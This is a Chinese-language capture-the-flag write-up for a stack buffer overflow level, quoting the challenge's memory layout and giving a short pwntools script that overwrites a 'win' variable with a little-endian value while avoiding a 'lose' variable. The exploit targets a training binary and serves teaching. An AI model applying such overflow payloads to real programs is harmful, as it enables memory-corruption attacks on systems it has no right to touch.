# 挑战简介
```
我们的堆栈指针指向 0x7ffd98e9c790，基指针指向 0x7ffd98e9c7f0。
这意味着我们的堆栈框架中有（十进制）14 个 8 字节字，
包括保存的基指针和保存的返回地址，
总共 112 个字节。
输入缓冲区从 0x7ffd98e9c7c0 开始，位于堆栈框架的中途，
（堆栈中“上方”是函数使用的其他局部变量）。
您的输入将被读入此缓冲区。
缓冲区长度为 27 个字节，但程序会让您提供任意大的输入长度，从而溢出缓冲区。

在此级别中，有一个“win”变量。
默认情况下，此变量的值为零。
但是，如果您可以将变量设置为 0x679b4be5，则会打印该标志。
您可以通过溢出输入缓冲区来更改此变量，但要记住字节序！
“win”变量存储在 0x7ffd98e9c7dc，即输入缓冲区开始后的 28 个字节。

但要小心！还有一个 LOSE 变量。如果此变量最终为非零，则程序将终止，并且您将不会获得标志。注意不要覆盖此变量。

“lose”变量存储在 0x7ffd98e9c7e0，即输入缓冲区开始后的 32 个字节。

我们已针对此挑战禁用以下标准内存损坏缓解措施：
- 二进制文件*不*与位置无关。这意味着每次运行时它都会位于同一位置，这意味着通过分析二进制文件（使用 objdump 或读取此输出），您可以知道覆盖返回地址所需的确切值。

您已选择发送 4096 个字节的输入！
这将允许您从 0x7ffd98e9c7c0（输入缓冲区的起始位置）写入
直到（但不包括）0x7ffd98e9d7c0（超出缓冲区末尾 4069 个字节）。
发送您的有效负载（最多 4096 个字节）！
```

# 思路
这题就需要我们给win参数一个变量，赋值一个规定的4字节的十六进制的数  

需要注意的是，输入进去的十六进制格式，会转化成'0xaaaaaa'的格式，比如b'\xe5\x4b\x9b\x67'进去，就会0x679b4be5出来

还要注意的是，lose函数在第32字节，win变量在第28字节，最多只能接收4个字节，多了就四了，换行符也算

代码如下
```
#!/usr/bin/python
from pwn import *
import struct

context(os='linux',arch='AMD64',log_level='debug')
p = process('/challenge/binary-exploitation-var-control-w')

p.recvuntil('Send your payload (up to 4096 bytes)!\n')
p.send(b'a' * 28 + b'\xe5\x4b\x9b\x67')
p.recvall()
```
